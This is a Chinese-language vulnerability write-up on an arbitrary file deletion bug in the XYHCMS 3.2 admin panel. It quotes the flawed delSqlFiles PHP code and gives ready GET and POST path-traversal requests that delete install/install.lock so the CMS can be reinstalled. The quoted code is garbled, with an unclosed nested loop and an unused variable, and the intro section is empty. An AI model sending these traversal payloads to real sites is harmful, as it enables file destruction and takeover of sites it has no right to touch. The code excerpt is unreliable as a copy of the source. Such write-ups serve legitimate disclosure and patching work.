<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>XYHCMS 3.2 后台任意文件删除漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>XYHCMS 3.2</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>/App/Manage/Controller/DatabaseController.class.php</p><p>//删除sql文件<br />public function delSqlFiles() {<br />  <br />    $id = I('id', 0, 'intval');<br />    $batchFlag = I('get.batchFlag', 0, 'intval');<br />    //批量删除<br />    if ($batchFlag) {<br />        $files = I('key', array());<br />    } else {<br />        $files[] = I('sqlfilename', '');<br />    }<br />  <br />    if (empty($files)) {<br />        $this-&gt;error('请选择要删除的sql文件');<br />    }<br />    foreach ($files as $file) {<br />        $_ext = pathinfo($file, PATHINFO_EXTENSION);<br />        //拼接后直接删除<br />  <br />    foreach ($files as $file) {<br />        unlink($this-&gt;getDbPath() . '/' . $file);<br />    }<br />    $this-&gt;success(&quot;已删除：&quot; . implode(&quot;,&quot;, $files), U('Database/restore'));<br />  <br />}</p><h3>漏洞复现</h3><ol class="pydocx-list-style-type-decimal"><li>登录后台</li><li>删除安装锁文件<ol class="pydocx-list-style-type-lowerLetter"><li>get方式</li></ol></li></ol><ul><li>http://www.0-sec.org/xyhai.php? s=/Database/delSqlFiles/sqlfilename/..\\..\\..\\install/install.lock</li></ul><ol class="pydocx-list-style-type-lowerLetter"><li>post方式</li></ol><ul><li>http://www.0-sec.org/xyhai.php?s=/Database/delSqlFiles/batchFlag/1</li><li>POST数据：key[]=../../../install/install.lock</li></ul><ol class="pydocx-list-style-type-decimal"><li>之后访问 http://www.0-sec.org/install重装cms</li></ol></body></html>